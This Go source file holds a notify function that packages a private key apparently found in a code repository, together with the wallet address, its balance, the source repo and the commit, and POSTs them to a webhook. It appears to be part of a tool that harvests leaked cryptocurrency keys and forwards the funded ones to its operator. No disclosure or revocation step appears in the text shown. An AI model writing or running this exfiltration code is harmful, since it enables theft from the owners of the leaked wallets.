package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

type webhookPayload struct {
	Chain        string `json:"chain"`
	Address      string `json:"address"`
	BalanceHuman string `json:"balance_human"`
	RawKey       string `json:"private_key"`
	SourceRepo   string `json:"source_repo"`
	SourceCommit string `json:"source_commit"`
	Timestamp    string `json:"timestamp"`
}

func notify(ctx context.Context, key FoundKey, b BalanceResult, webhookURL string) {
	payload := webhookPayload{
		Chain:        b.Chain,
		Address:      b.Address,
		BalanceHuman: b.BalanceHuman,
		RawKey:       key.Raw,
		SourceRepo:   key.Repo,
		SourceCommit: key.CommitSHA,
		Timestamp:    time.Now().UTC().Format(time.RFC3339),
	}

	body, err := json.Marshal(payload)
	if err != nil {
		logger.Printf("[notify] marshal error: %v", err)
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, webhookURL, bytes.NewReader(body))
	if err != nil {
		logger.Printf("[notify] request error: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		logger.Printf("[notify] POST error: %v", err)
		return
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if resp.StatusCode >= 300 {
		logger.Printf("[notify] webhook returned %d: %s", resp.StatusCode, string(respBody))
		return
	}

	fmt.Printf("NOTIFIED %s %s from %s (key in %s@%s)\n",
		b.BalanceHuman, b.Chain, b.Address, key.Repo, key.CommitSHA[:8])
}
